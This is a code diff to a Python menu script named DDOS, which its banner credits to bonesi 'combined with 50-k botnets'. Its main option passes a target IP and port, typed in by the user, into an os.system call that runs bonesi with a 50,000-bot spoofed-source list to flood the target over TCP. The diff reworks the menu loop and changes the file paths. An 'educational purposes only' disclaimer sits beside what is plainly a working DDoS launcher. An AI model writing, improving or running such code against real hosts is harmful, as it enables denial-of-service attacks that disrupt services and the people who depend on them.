@@ -3,7 +3,9 @@ import sys
 import time
 
 class DDOS:
-    print("""
+    
+    while True:
+        print("""
     
 ____  ___                  ________  ________          _________
 \   \/  /____   ____   ____\______ \ \______ \   ____ /   _____/
@@ -12,16 +14,15 @@ ____  ___                  ________  ________          _________
 /___/\  \___  >___|  /\____/_______  /_______  /\____/_______  /
       \_/   \/     \/              \/        \/              \/ 
 """)
-    print("""
+        print("""
 Powered by: bonesi ddos tool combined with 50-k botnets
 DISCLAIMER: This tool is for educational purposes only.
 Created by: Genesis""")
 
-    print("""
+        print("""
     [1] DDOS ATTACK
     [2] ping host
     [3] exit \n""")
-    while True:
         choice = input("Enter your choice: ")
         if choice == "1":
             print("""
@@ -36,7 +37,7 @@ Created by: Genesis""")
                     host_ip = input("Enter the host ip: ")
                     host_port = input("Enter the host port: ")
                     net_interface = input("Enter the network interface: ")
-                    os.system('bonesi -i /usr/share/bonesi/50k-bots.txt -p tcp -r 0 -d '+net_interface+' -b /usr/share/bonesi/browserlist.txt ' + host_ip + ':' + host_port)
+                    os.system('bonesi -i /root/usr/share/bonesi/50k-bots.txt -p tcp -r 0 -d '+net_interface+' -b /root/usr/share/bonesi/browserlist.txt ' + host_ip + ':' + host_port)
                     time.sleep(5)
                     os.system('clear')
                 if choice == "2":
